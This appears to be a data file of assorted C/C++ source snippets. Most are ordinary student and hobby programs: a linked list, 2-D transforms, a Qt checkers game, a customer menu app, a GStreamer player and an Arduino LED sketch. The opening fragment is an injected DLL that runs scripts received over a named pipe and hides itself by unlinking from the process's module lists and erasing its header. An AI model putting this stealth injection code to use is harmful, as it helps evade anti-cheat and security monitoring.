PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,\n\t\t\t\tPIPE_WAIT,\n\t\t\t\t1,\n\t\t\t\t999999,\n\t\t\t\t999999,\n\t\t\t\tNMPWAIT_USE_DEFAULT_WAIT,\n\t\t\t\tNULL);\n\t\t\twhile (hPipe != INVALID_HANDLE_VALUE)\n\t\t\t{\n\t\t\t\tif (ConnectNamedPipe(hPipe, NULL) != FALSE)\n\t\t\t\t{\n\t\t\t\t\twhile (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)\n\t\t\t\t\t{\n\t\t\t\t\t\tbuffer[dwRead] = '\\0';\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tWholeScript = WholeScript + buffer;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tcatch (...) {\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch (std::exception e) {\n\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch (...) {\n\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tEnv::Primary::Execute(WholeScript.c_str());\n\n\t\t\t\t\tWholeScript = \"\";\n\t\t\t\t}\n\t\t\t\tDisconnectNamedPipe(hPipe);\n\t\t\t}\n#endif\n\t\t}\n\t}\n\treturn 0;\n}\n\n/*\nUsed as the entry point for the DLL.\n*/\nunsigned int ProtectSections(HMODULE Module) \n{\n\tMODULEINFO ModuleInfo;\n\tGetModuleInformation(GetCurrentProcess(), Module, &ModuleInfo, sizeof(ModuleInfo));\n\tuintptr_t Address = reinterpret_cast<uintptr_t>(Module);\n\tuintptr_t TermAddress = Address + ModuleInfo.SizeOfImage;\n\tMEMORY_BASIC_INFORMATION MemoryInfo;\n\n\n\twhile (Address < TermAddress) {\n\t\tVirtualQuery(reinterpret_cast<void*>(Address), &MemoryInfo, sizeof(MemoryInfo));\n\t\tif (MemoryInfo.State == MEM_COMMIT && (MemoryInfo.Protect & (PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {\n\t\t\tDWORD OldProtection;\n\t\t\tVirtualProtect(reinterpret_cast<void*>(Address), MemoryInfo.RegionSize, PAGE_EXECUTE_READ, &OldProtection);\n\t\t}\n\t\tAddress = reinterpret_cast<uintptr_t>(MemoryInfo.BaseAddress) + MemoryInfo.RegionSize;\n\t}\n\n\tVirtualQuery(reinterpret_cast<void*>(MemoryInfo.AllocationBase), &MemoryInfo, sizeof(MemoryInfo));\n\tif (MemoryInfo.State != MEM_COMMIT || !(MemoryInfo.Protect & PAGE_EXECUTE_READ))\n\t\treturn 0x400;\n\treturn MemoryInfo.RegionSize - 0x400;\n}\n\n__forceinline void UnlinkModule(HINSTANCE Module\n) {\n\tunsigned long PEB_DATA = 0;\n\t_asm {\n\t\tpushad;\n\t\tpushfd;\n\t\tmov eax, fs: [30h]\n\t\t\tmov eax, [eax + 0Ch]\n\t\t\tmov PEB_DATA, eax\n\n\t\t\tInLoadOrderModuleList :\n\t\tmov esi, [eax + 0Ch]\n\t\t\tmov edx, [eax + 10h]\n\n\t\t\tLoopInLoadOrderModuleList :\n\t\t\tlodsd\n\t\t\tmov esi, eax\n\t\t\tmov ecx, [eax + 18h]\n\t\t\tcmp ecx, Module\n\t\t\tjne SkipA\n\t\t\tmov ebx, [eax]\n\t\t\tmov ecx, [eax + 4]\n\t\t\tmov[ecx], ebx\n\t\t\tmov[ebx + 4], ecx\n\t\t\tjmp InMemoryOrderModuleList\n\n\t\t\tSkipA :\n\t\tcmp edx, esi\n\t\t\tjne LoopInLoadOrderModuleList\n\n\t\t\tInMemoryOrderModuleList :\n\t\tmov eax, PEB_DATA\n\t\t\tmov esi, [eax + 14h]\n\t\t\tmov edx, [eax + 18h]\n\n\t\t\tLoopInMemoryOrderModuleList :\n\t\t\tlodsd\n\t\t\tmov esi, eax\n\t\t\tmov ecx, [eax + 10h]\n\t\t\tcmp ecx, Module\n\t\t\tjne SkipB\n\t\t\tmov ebx, [eax]\n\t\t\tmov ecx, [eax + 4]\n\t\t\tmov[ecx], ebx\n\t\t\tmov[ebx + 4], ecx\n\t\t\tjmp InInitializationOrderModuleList\n\n\t\t\tSkipB :\n\t\tcmp edx, esi\n\t\t\tjne LoopInMemoryOrderModuleList\n\n\t\t\tInInitializationOrderModuleList :\n\t\tmov eax, PEB_DATA\n\t\t\tmov esi, [eax + 1Ch]\n\t\t\tmov edx, [eax + 20h]\n\n\t\t\tLoopInInitializationOrderModuleList :\n\t\t\tlodsd\n\t\t\tmov esi, eax\n\t\t\tmov ecx, [eax + 08h]\n\t\t\tcmp ecx, Module\n\t\t\tjne SkipC\n\t\t\tmov ebx, [eax]\n\t\t\tmov ecx, [eax + 4]\n\t\t\tmov[ecx], ebx\n\t\t\tmov[ebx + 4], ecx\n\t\t\tjmp Finished\n\n\t\t\tSkipC :\n\t\tcmp edx, esi\n\t\t\tjne LoopInInitializationOrderModuleList\n\n\t\t\tFinished :\n\t\tpopfd;\n\t\tpopad;\n\t}\n}\n\nBOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, void* Reserved)\n{\n\tDisableThreadLibraryCalls(Module);\n\tINDICIUM_ENGINE_CONFIG cfg;\n\tINDICIUM_ENGINE_CONFIG_INIT(&cfg);\n\tcfg.Direct3D.HookDirect3D9 = TRUE;\n\tcfg.Direct3D.HookDirect3D10 = TRUE;\n\tcfg.Direct3D.HookDirect3D11 = TRUE;\n\tcfg.EvtIndiciumGameHooked = EvtIndiciumGameHooked;\n\tswitch (Reason)\n\t{\n\tcase DLL_PROCESS_ATTACH:\n\t{\n\t\tUnlinkModule(Module);\n\t\tDWORD OldProtection;\n\t\tVirtualProtect(Module, 4096, PAGE_READWRITE, &OldProtection);\n\t\tZeroMemory(Module, 4096);\n\t\tProtectSections(Module);\n\t\tHANDLE hThread = NULL;\n\t\tHANDLE hDllMainThread = GetCurrentThread();\n\t\tif (Reserved == NULL) {\n\t\t\tif (!engine)\n\t\t\t{\n\t\t\t\tIndiciumEngineCreate(Module, &cfg, NULL);\n\t\t\t}\n\t\t\tif (!(hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL)))\n\t\t\t{\n\t\t\t\tCloseHandle(hDllMainThread);\n\t\t\t\treturn FALSE;\n\t\t\t}\n\t\t\tCloseHandle(hThread);\n\t\t}\n\t\tbreak;\n\t}\n\tcase DLL_PROCESS_DETACH:\n\t{\n\t\tIndiciumEngineDestroy(Module);\n\t}\n\t}\n\treturn TRUE;\n}",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct node\r\n{\r\n      int data;\r\n      struct node *next;\r\n};\r\nvoid TraverseNode(struct node *head)\r\n{\r\n      while(head!=NULL)\r\n      {\r\n            cout<<\"Element:\"<<head->data<<endl;\r\n            head=head->next;\r\n      }\r\n}\r\nstruct node *InsertNodeSpecificPosition(struct node *p,int value,int position)\r\n{\r\n      int i=0;\r\n      struct node *ptr=NULL,*head=NULL;\r\n      ptr=(struct node *)malloc(sizeof(struct node));\r\n      head=(struct node *)malloc(sizeof(struct node));\r\n      ptr=p;\r\n      while(i!=position-1)\r\n      {\r\n            ptr=ptr->next;\r\n            i++;\r\n      }\r\n      head->next=ptr->next;\r\n      head->data=value;\r\n      ptr->next=head;\r\n      return ptr;\r\n};\r\nint main()\r\n{\r\n       struct node *head=NULL,*first=NULL,*second=NULL,*third=NULL;\r\n       //Dynamic Memory Allocate\r\n       head=(struct node *)malloc(sizeof(struct node));\r\n       first=(struct node *)malloc(sizeof(struct node));\r\n       second=(struct node *)malloc(sizeof(struct node));\r\n       third=(struct node *)malloc(sizeof(struct node));\r\n       //Assign value and Creat link\r\n       head->data=10;\r\n       head->next=first;\r\n       first->data=20;\r\n       first->next=second;\r\n       second->data=30;\r\n       second->next=third;\r\n       third->data=40;\r\n       third->next=NULL;\r\n       //Traverse Node Before Insert New Node\r\n       cout<<\"Traverse Node Before Insert New Node:\"<<endl;\r\n       TraverseNode(head);\r\n       //Insert Node at Specific Position\r\n       head=InsertNodeSpecificPosition(head,60,0);\r\n       cout<<\"Traverse Node insert at Specific Position:\"<<endl;\r\n       TraverseNode(head);\r\n}\r\n",
    "\r\n\r\n/*Write C++ program to draw 2-D object and perform following basic transformations, \r\na) Scaling \r\nb) Translation \r\nc) Rotation \r\nUse operator overloading.*/\r\n\r\n#include<iostream>\r\n#include<graphics.h>\r\n#include<math.h>\r\nusing namespace std;\r\nvoid disp(int n,float c[][3])\r\n{\r\n\tfloat maxx,maxy;\r\n\tint i;\r\n\tmaxx=getmaxx();\r\n\t\t\t \r\n\tmaxy=getmaxy();\r\n\t\t\t\r\n\tmaxx=maxx/2;\r\n\tmaxy=maxy/2;\r\n\ti=0;\r\n\r\n\twhile(i<n-1)\r\n\t{\r\n\t     line(maxx+c[i][0],maxy-c[i][1], maxx+c[i+1][0],maxy-c[i+1][1]);\r\n\t     i++;\r\n\t}\r\n\ti=n-1;\r\n\tline(maxx+c[i][0],maxy-c[i][1], maxx+c[0][0],maxy-c[0][1]);\r\n\t\r\n\tsetcolor(GREEN);\r\n\tline(0,maxy,maxx*2,maxy);\r\n\tline(maxx,0,maxx,maxy*2);\r\n\tsetcolor(WHITE);\r\n}\r\n\r\nvoid mul(int n,float b[][3],float c[][3],float a[][3])\r\n{\r\n\tint i,j,k;\r\n\tfor(i=0;i<n;i++)\r\n\t\tfor(j=0;j<3;j++)\r\n\t\t\ta[i][j]=0;\t\t\r\n\tfor(i=0;i<n;i++)\r\n\t\tfor(j=0;j<3;j++)\r\n\t\t\tfor(k=0;k<3;k++)\r\n\t\t\t{\r\n\t\t\t\ta[i][j] = a[i][j] + (c[i][k] * b[k][j]);\r\n\t\t\t}\r\n}\r\nvoid translation(int n,float c[][3],float tx,float ty)\r\n{\r\n\tfloat b[10][3],a[10][3];\r\n\tint i=0,j;\r\n\tfor(i=0;i<3;i++)\r\n\t\tfor(j=0;j<3;j++)\r\n\t\t\tb[i][j]=0;\r\n\r\n\tb[0][0]=1;\r\n\tb[1][1]=1;\r\n\tb[2][0]=tx;\r\n\tb[2][1]=ty;\r\n\tb[2][2]=1;\r\n\r\n\tmul(n,b,c,a);\r\n\tsetcolor(RED);\r\n\tdisp(n,a);\r\n\tgetch();\r\n}\r\n\r\n\r\n\r\nvoid scaling(int n,float c[][3],float sx,float sy)\r\n{\r\n\tfloat b[10][3],a[10][3];\r\n\tint i=0,j;\r\n\tfor(i=0;i<3;i++)\r\n\t\tfor(j=0;j<3;j++)\r\n\t\t\tb[i][j]=0;\r\n\tb[0][0]=sx;\r\n\tb[1][1]=sy;\r\n\tb[2][2]=1;\r\n\r\n\tmul(n,b,c,a);\r\n\tsetcolor(RED);\r\n\tdisp(n,a);\r\n\tgetch();\r\n}\r\nvoid rotation(int n,float c[][3],float ra)\r\n{\r\n\tint i=0,j;\r\n\tfloat b[10][3],xp,yp,a[10][3];\r\n\txp=c[0][0];\r\n\typ=c[0][1];\r\n\tfor(i=0;i<3;i++)\r\n\t\tfor(j=0;j<3;j++)\r\n\t\t\tb[i][j]=0;\r\n\tb[0][0]=b[1][1]=cos(ra*3.14/180);\r\n\tb[0][1]=sin(ra*3.14/180);\r\n\tb[1][0]=-sin(ra*3.14/180);\r\n\tb[2][0]=(-xp*cos(ra*3.14/180))+(yp*sin(ra*3.14/180))+xp;\r\n\tb[2][1]=(-xp*sin(ra*3.14/180))-(yp*cos(ra*3.14/180))+yp;\r\n\tb[2][2]=1;\r\n\tmul(n,b,c,a);\r\n\tsetcolor(RED);\r\n\tdisp(n,a);\r\n}\r\nint main()\r\n{\r\n\tint i,j,k,cho,n,gd=DETECT,gm;\r\n\tfloat c[10][3],tx,ty,sx,sy,ra;\r\n\tinitgraph(&gd,&gm,NULL);\r\n\tcout<<\"\\nEnter the number of vertices :\";\r\n\tcin>>n;\r\n\tfor(i=0;i<n;i++)\r\n\t{\r\n\t\tcout<<\"\\nEnter the co-ordinates of the vertex\"<<i+1<<\":\";\r\n\t\tcin>>c[i][0]>>c[i][1];\r\n\t\tc[i][2]=1;\r\n\t}\r\n\tdo\r\n\t{\r\n\t\t\r\n\t\tcleardevice();\r\n\t\tcout<<\"\\n------------------------MENU------------------------\";\r\n\t\tcout<<\"\\n1)Press 1 for Translation\";\r\n\t\tcout<<\"\\n2)Press 2 for Scaling\";\r\n\t\tcout<<\"\\n3)Press 3 for Rotation\";\r\n\t\tcout<<\"\\n4)Press 4 to EXIT\";\r\n\t\tcout<<\"\\nENTER YOUR CHOICE:\";\r\n\t\tcin>>cho;\r\n\t\tswitch(cho)\r\n\t\t{\r\n\t\tcase 1:\r\n\t\t\tcout<<\"\\nEnter translation factor for X & Y axis :\\t\";\r\n\t\t\tcin>>tx>>ty;\r\n\t\t\tcleardevice();\r\n\t\t\tsetcolor(BLUE);\r\n\t\t\tdisp(n,c);\r\n\t\t\ttranslation(n,c,tx,ty);\r\n\t\t\tgetch();\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tcout<<\"\\nEnter scaling factor for X & Y axis :\\t\";\r\n\t\t\tcin>>sx>>sy;\r\n\t\t\tcleardevice();\r\n\t\t\tsetcolor(BLUE);\r\n\t\t\tdisp(n,c);\r\n\t\t\tscaling(n,c,sx,sy);\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tcout<<\"\\n\\nEnter the angle of rotation:\\t\";\r\n\t\t\tcin>>ra;\r\n\t\t\tcleardevice();\r\n\t\t\tsetcolor(BLUE);\r\n\t\t\tdisp(n,c);\r\n\t\t\trotation(n,c,ra);\r\n\t\t\tgetch();\r\n\t\t\tbreak;\r\n\t\tcase 4:\r\n\t\t\texit(0);\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tcout<<\"\\nInvalid choice !!\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}while(cho!=4);\r\n\tgetch();\r\n\tclosegraph();\r\n\treturn 0;\r\n}\r\n",
    "#include <QTimer>\r\n#include <QPushButton>\r\n#include <QComboBox>\r\n#include <QMessageBox>\r\n#include <QCheckBox>\r\n#include <map>\r\n#include \"main.h\"\r\n#include \"checkersgame.h\"\r\n#include \"backdrop.h\"\r\n#include \"boardsquare.h\"\r\n#include \"gamepiece.h\"\r\n#include \"ai.h\"\r\n\r\nnamespace CV\r\n{\r\n    std::map<std::pair<char, char>, char> gameBoard;\r\n    std::map<std::pair<char, char>, char> userCreatedBoard;\r\n\r\n    int playerTurn = Black;         //Determines which color goes first\r\n    int boardLayout = Standard;\r\n    int gameStatus = ValidMove;     //Displays in right hand corner\r\n\r\n    QString movesListString = QString(\"Red\\tBlack\\n\");  //keeps a list of the moves taken\r\n    QString movesListString2 = QString(\"Red\\tBlack\\n\"); //for the second column if the first fills up\r\n}\r\nnamespace CF\r\n{\r\n    bool editedCustomBoardFlag = false;     //Has a custom board been created?\r\n    bool resetFlag = false;                 //Resets the game\r\n    bool refreshFlag = false;               //Refreshes the scene\r\n    bool redAIFlag = false;\r\n    bool blackAIFlag = false;\r\n    bool playerMovingFlag = false;\r\n}\r\n\r\nvoid drawSceneBoard(QGraphicsScene & scene)\r\n{\r\n    int xOffset = 10;\r\n    int yOffset = 85;\r\n\r\n    QGraphicsTextItem * titleText = scene.addText(QString(\"CHECKERS\"));\r\n    titleText->setFont(QFont(\"Arial\", 50));\r\n    titleText->setPos(180, -30);\r\n\r\n    QGraphicsTextItem * playerTurnText = scene.addText( (CV::playerTurn == Red) ? QString(\"Red's Turn\") : QString(\"Black's Turn\") );\r\n    playerTurnText->setFont(QFont(\"Arial\", 18));\r\n    playerTurnText->setPos(0, 30);\r\n\r\n    //Displays if the move was valid or if a colour has won\r\n    QGraphicsTextItem * displayBar = scene.addText(QString(CV::gameStateVector.at(CV::gameStatus).c_str()));\r\n    displayBar->setFont(QFont(\"Arial\", 18));\r\n    displayBar->setPos(620+75, 20);\r\n\r\n    //Displays the moves that have been made this game\r\n    QGraphicsTextItem * movesList = scene.addText(CV::movesListString);\r\n    movesList->setFont(QFont(\"Arial\", 12));\r\n    movesList->setPos(620+75, 150);\r\n    //movesList->setTextWidth(100);\r\n    movesList->setTextInteractionFlags(Qt::TextSelectableByMouse | Qt::TextSelectableByKeyboard);\r\n\r\n    if(CV::movesListString.size() >= 694)\r\n    {\r\n        //if the text gets too long, off the window, start a new column\r\n        QGraphicsTextItem * movesList2 = scene.addText(CV::movesListString2);\r\n        movesList2->setFont(QFont(\"Times\", 12));\r\n        movesList2->setPos(800+75, 150);\r\n        movesList2->setTextInteractionFlags(Qt::TextSelectableByMouse | Qt::TextSelectableByKeyboard);\r\n    }\r\n\r\n    //reset button\r\n    QPushButton *resetButton = new QPushButton;\r\n    QObject::connect(resetButton, &QPushButton::clicked, [](){CF::resetFlag = true;});\r\n    resetButton->setFont(QFont(\"Arial\", 14));\r\n    resetButton->setGeometry(QRect(695, 75, 120, 30));\r\n    resetButton->setText(\"Reset\");\r\n    scene.addWidget(resetButton);\r\n\r\n    //refresh button\r\n    QPushButton *refreshButton = new QPushButton;\r\n    QObject::connect(refreshButton, &QPushButton::clicked, [](){CF::refreshFlag = true;});\r\n    refreshButton->setFont(QFont(\"Arial\", 14));\r\n    refreshButton->setGeometry(QRect(815, 75, 120, 30));\r\n    refreshButton->setText(\"Refresh \\u21BA\"); //unicode refresh symbol\r\n    scene.addWidget(refreshButton);\r\n\r\n    if(CV::boardLayout == CustomBoardCreate)\r\n    {\r\n        //Only shows play button if in the \"Create\" tab\r\n        QPushButton *playButton = new QPushButton;\r\n        QObject::connect(playButton, &QPushButton::clicked,\r\n                         [](){CV::boardLayout = CustomBoardPlay; CF::resetFlag = true;});\r\n        playButton->setFont(QFont(\"Arial\", 14));\r\n        playButton->setGeometry(QRect(620 + 75, 30, 240, 45));\r\n        playButton->setText(\"Play!\");\r\n        scene.addWidget(playButton);\r\n    }\r\n\r\n    QComboBox *comboBox = new QComboBox;\r\n    comboBox->setFont(QFont(\"Arial\", 14));\r\n    comboBox->setGeometry(620+75, 105, 240/*120*/, 30);\r\n    comboBox->setFrame(true);\r\n    comboBox->addItem(QString(\"Select Board-Layout  \\u25BC\"), 0); //unicode down pointer\r\n    comboBox->addItem(QString(\"Standard\"), Standard);\r\n    comboBox->addItem(QString(\"Kings\"), Kings);\r\n    comboBox->addItem(QString(\"The Akel\"), TheAkel);\r\n    comboBox->addItem(QString(\"TwoRows\"), TwoRows);\r\n    comboBox->addItem(QString(\"Create Custom Board\"), CustomBoardCreate);\r\n\r\n    if(CF::editedCustomBoardFlag) comboBox->addItem(QString(\"Play Custom Board\"), CustomBoardPlay);\r\n    QObject::connect(comboBox, QOverload<int>::of(&QComboBox::activated),\r\n        [&](int index){ if (index != 0) CV::boardLayout = index; else CV::boardLayout = Standard; });\r\n    scene.addWidget(comboBox);\r\n\r\n    QCheckBox *checkboxRedAI = new QCheckBox;\r\n    checkboxRedAI->setFont(QFont(\"Arial\", 14));\r\n    checkboxRedAI->setText(\"Red AI\");\r\n    checkboxRedAI->setGeometry(QRect(630 + 85 + 250, 75, 120, 30));\r\n    checkboxRedAI->setCheckState(CF::redAIFlag ? Qt::Checked : Qt::Unchecked);\r\n    QObject::connect(checkboxRedAI, ",
    "/*\nENUNCIADO\nUna Empresa que vende \u201cproductos de seguridad industrial NicTech\u201d nos convoca para la realizaci\u00f3n\nde una App que permita registrar los Pedidos de Art\u00edculos de los clientes.\n\nEn esta etapa del desarrollo, solo deberemos realizar el m\u00f3dulo \u201cClientes\u201d\n\nLa misma debe permitir:\n\nGestionar los Clientes\nDar de alta el cliente (el c\u00f3digo del cliente se obtiene sumando 100 al \u00edndice del Array).\nDar de Baja los clientes x c\u00f3digo de cliente.\nModificar los clientes, ingresar el c\u00f3digo, mostrarlo y editarlo.\nListar los Clientes.\nListar todos los Clientes.\nBuscar un Clientes x c\u00f3digo y mostrarlo (imprimir cartel de no encontrado).\n.  Todo esto mediante un Men\u00fa, Modularizando en Funciones, utilizando Archivos, arreglos y estructuras.\n\n\nNOTA IMPORTANTE: (personal no parte del enunciado)\n    por una cuestion de simplificar el manejo de datos se usaran solo strings simples sin espacios\n    ej nombre valido = Juan, no valido Juan Perez\n    lo mismo que el nombre de la ciudad: valido = Mardel y no valido = Mar del plata\n\n    el manejo de nombres con mas de una palabra se puede implementar pero hay que guardar los datos \n    al archivo de alguna manera especial para que no se pierda la informacion.\n    ahora para simplificar esta guardados con una separacion de espacio entre los campos de la estructura\n    ej\n    codigo nombre ciudad\n    123 Juan Mardel\n\n    */\n\n#include <iostream>                 // libreria para cin y cout\n#include <fstream>                  // libreria para manejo de archivos\n#include <sstream>\n#include <string>\nusing namespace std;                // simplifica el uso de cout y cin para no usar std::cout y std::cin\n\nconst int MAX_CUSTOMERS = 100;  // Constante global para el maximo de clientes (se usara para el array)\n\ntypedef struct{         // Estructura de Clientes (codigo, nombre, ciudad)\n    int code;\n    string name;\n    string city;\n}Customer;\n\ntypedef struct{    // Estructura de Contenedor (array de clientes y numero de clientes=tamano del array)\n    Customer customers[MAX_CUSTOMERS];\n    int cont;\n}Container;\n\nvoid loadFromfile(Container &CustomerList);    // Carga los datos del archivo al contenedor (array)\nvoid saveToFile(Container &CustomerList);      // Guarda los datos del contenedor (array) al archivo\nvoid addCustomer(Container &CustomerList);     // Funci\u00f3n para dar de alta un cliente\nvoid removeCustomer(Container &CustomerList);  // Funci\u00f3n para dar de baja un cliente\nvoid updateCustomer(Container &CustomerList);  // Funci\u00f3n para modificar un cliente\nvoid listCustomers(Container const &CustomerList);   // Funci\u00f3n para listar todos los clientes (se le pasa como const para que no se pueda modificar)\nvoid findCustomer(Container const &CustomerList);    // Funci\u00f3n para buscar un cliente por c\u00f3digo e imprimirlo (Se le pasa como const para que no se pueda modificar)\nvoid clearConsole();                        // Limpia la consola\nvoid pauseConsole(string txt = \"Presione ENTER para continuar...\");                        // Pausa la consola y pide presionar ENTER para continuar\nbool fileEmpty(ifstream &file);\n\nint main() \n{   \n    clearConsole();                         // Limpia la consola todos lo usos de clearConsole() y pauseConsole() usados en el \n                                            //  programa son de uso opcional y estan puesto para una mejor presentaci\u00f3n.        \n    \n    int menu;                               // variable usada para el men\u00fa principal\n    \n    Container CustomerList;                    // variable para el contenedor (podria haber tenido cualquier otro nombre nomina, CustomerList) \n    CustomerList.cont = 0;             // inicializo la cantidad de clientes a cero\n    \n    loadFromfile(CustomerList);                // Carga los datos del archivo al contenedor CustomerList\n\n    do \n    {\n        cout << \"-------------- MENU --------------\" << endl;\n        cout << \"1. Dar de alta un cliente\" << endl;\n        cout << \"2. Dar de baja un cliente\" << endl;\n        cout << \"3. Modificar un cliente\" << endl;\n        cout << \"4. Listar todos los clientes\" << endl;\n        cout << \"5. Buscar un cliente por codigo\" << endl;\n        cout << \"6. Salir\" << endl;\n        cout << \"Ingrese una opcion: \";\n        cin >> menu;                                    // lee una opcion del menu (un entero)\n        cout << endl;\n        switch (menu)                                    // el SWITCH evalua el valor del entero y ejecuta el CASE correspondiente\n        {\n            case 1: \n            {   addCustomer(CustomerList);              // llama a la funcion para dar de alta un cliente pasandole la variable CustomerList\n                break;\n            }\n            case 2: \n            {   removeCustomer(CustomerList);          // llama a la funcion para dar de baja un cliente pasandole la variable CustomerList\n                break;\n            }\n            case 3: \n            {   updateCustomer(CustomerList);          // llama a la funcion para modificar un cliente pa",
    "/*\n * File name: VideoPlayer.cpp\n * Author: ToshibaMastru\n * Copyright (c) 2024 ToshibaMastru\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include \"VideoPlayer.h\"\n#include <gst/video/videooverlay.h>\n#include \"GStreamer.h\"\n#include \"KLoggeg.h\"\n\nVideoPlayer::VideoPlayer(const VideoSettings& settings) : settings(settings), loop(GStreamer::getMainLoop()) {}\n\nVideoPlayer::~VideoPlayer() {\n    stop();\n}\n\nbool VideoPlayer::init() {\n    pipeline = gst_pipeline_new(\"video-player\");\n    GstElement *source = gst_element_factory_make(\"filesrc\", nullptr);\n    GstElement *demuxer = gst_element_factory_make(\"qtdemux\", nullptr);\n    GstElement *decoder = gst_element_factory_make(\"decodebin3\", nullptr);\n    GstElement *converter = gst_element_factory_make(\"videoconvert\", nullptr);\n    GstElement *tee = gst_element_factory_make(\"tee\", \"t\");\n\n    if (!pipeline || !source || !demuxer || !decoder || !converter || !tee) {\n        fatal(\"VideoPlayer\") << \"One element could not be created\"; // \ud80c\udd8f\n        return false;\n    }\n\n    gst_bin_add_many(GST_BIN(pipeline), source, demuxer, decoder, converter, tee, NULL);\n\n    if (!gst_element_link(source, demuxer)) {\n        fatal(\"VideoPlayer\") << \"Source and Demuxer could not be linked\";\n        return false;\n    }\n\n    g_signal_connect(demuxer, \"pad-added\", G_CALLBACK(onNewPad), decoder);\n    g_signal_connect(decoder, \"pad-added\", G_CALLBACK(onNewPad), converter);\n\n    if (!gst_element_link_many(converter, tee, NULL)) {\n        fatal(\"VideoPlayer\") << \"Elements could not be linked\";\n        return false;\n    }\n\n    g_object_set(G_OBJECT(source), \"location\", settings.filename.data(), NULL);\n\n    GstBus *bus;\n    if ((bus = gst_pipeline_get_bus(GST_PIPELINE(pipeline))) != nullptr) {\n        gst_bus_add_watch(bus, onBusMessage, this);\n        gst_object_unref(bus);\n        bus = nullptr;\n    }\n\n    return true;\n}\n\nbool VideoPlayer::start() {\n    GstStateChangeReturn ret = gst_element_set_state(pipeline, GST_STATE_PLAYING);\n    if (ret == GST_STATE_CHANGE_FAILURE) {\n        error(\"VideoPlayer\") << \"Pipeline failed to start\";\n        gst_object_unref(pipeline);\n        pipeline = nullptr;\n        return false;\n    }\n    return true;\n}\n\nvoid VideoPlayer::stop() {\n    if (pipeline){\n        gst_element_set_state(pipeline, GST_STATE_NULL);\n        gst_object_unref(GST_OBJECT(pipeline));\n        pipeline = nullptr;\n    }\n}\n\nbool VideoPlayer::addWindow(guintptr wid) {\n    GstElement *tee = gst_bin_get_by_name(GST_BIN(pipeline), \"t\");\n    if (tee == nullptr) {\n        fatal(\"VideoPlayer\") << \"Tee not found in pipeline\";\n        return false;\n    }\n\n    GstElement *queue;\n    GstElement *sink;\n    std::string sink_name;\n\n    switch (settings.overlay) {\n        case X11:\n            sink_name = \"xvimagesink\";\n            sink = gst_element_factory_make(\"xvimagesink\", nullptr);\n            break;\n        case OpenGL:\n            sink_name = \"glimagesink\";\n            sink = gst_element_factory_make(\"glimagesink\", nullptr);\n            break;\n        case Wayland:\n            sink_name = \"waylandsink\";\n            sink = gst_element_factory_make(\"waylandsink\", nullptr);\n            break;\n        case DirectX:\n            sink_name = \"d3dvideosink\";\n            break;\n        default:\n            fatal(\"VideoPlayer\") << \"Invalid video overlay option\";\n            return false;\n    }\n\n    queue = gst_element_factory_make(\"queue\", nullptr);\n    sink = gst_element_factory_make(sink_name.data(), nullptr);\n\n    if (!sink) {\n        fatal(\"VideoPlayer\") << \"Failed to create a \" << sink_name << \" element\";\n        return false;\n    }\n\n    if (!queue) {\n        fatal(\"VideoPlayer\") << \"Failed to create a queue element\";\n        return false;\n    }\n\n    g_object_set(G_OBJECT(queue), \"max-size-buffers\", 2, \"max-size-time\", 0, \"max-size-bytes\", 0, NULL);\n\n    gst_bin_add_many(GST_BIN(pipeline), queue, sink, NULL);\n    gst_element_link_many(tee, queue, sink, NULL);\n\n    gst_video_overlay_set_window_handle(GST_VIDEO_OVERLAY(sink), wid);\n\n    tee = queue = sink = nullptr;\n\n    return true;\n}\n\nvoid VideoPlayer::onNewPad(GstElement *element, GstPad *pad, GstElement *data) {\n    GstPad *sink_pad = gst_element_get_static_pad(data, \"sink\");\n    if (gst_pad_is_linked(sink_pad)) {\n        g_object_unref(sink_pad);\n        return;\n    }\n    if (gst_pad_link(pad, sink_pad) != GST_PAD_LINK_OK) {\n        error(\"VideoPlayer\") << \"",
    "#include <Arduino.h>\n#include <FastLED.h>\n\n#define LED_TYPE WS2812\n#define DATA_PIN 11\n#define COLOR_ORDER GRB\n#define BTN_1_PIN 5  // New Pin: 9, Old Pin: 5\n#define BTN_2_PIN 8\n#define BTN_3_PIN 12 // New Pin: 7, Old Pin: 12\n#define NUM_LEDS 48 // 48 leds is the max number before the frame rate starts to drop\n\n/****\nenum TimerEvents {Idle, Expired};\nenum MinMax {Min, Max};\n\nconstexpr uint8_t FlashLed {9};\nconstexpr uint32_t FlashTime[] {1000, 2000};\n\nstruct TIMER\n{\n  uint32_t now;\n  uint32_t trigger;\n  uint8_t control;\n  uint8_t expired ( uint32_t currentMillis)\n  {\n    uint8_t timerState = currentMillis - now >= trigger and control;\n    if (timerState == Expired ) now = currentMillis;\n    return (timerState);\n  }\n};\nTIMER blinkMe {0, 100, HIGH};\nTIMER flashLed {0, 10, HIGH};\n***/\n\nuint8_t iter8 = 0;\nfloat onFrames;\nfloat totalFrames;\nfloat freq = 60;  // 60 Hz\nfloat dutyCycle = .1;\nfloat fps = 500; // Some non-zero number. We will calculate the fps after startup\nfloat usPerFrame = 1; // Initialize with non-zero number\nfloat x = fps / freq;\n\nfloat freqDelta = 1;\nfloat dutyCycleDelta = .01;\nint deltaDirection = 1; // -1 or 1\n\nbool waitBtnHoldRelease = false;\nbool waitActionPerformed = false;\nbool 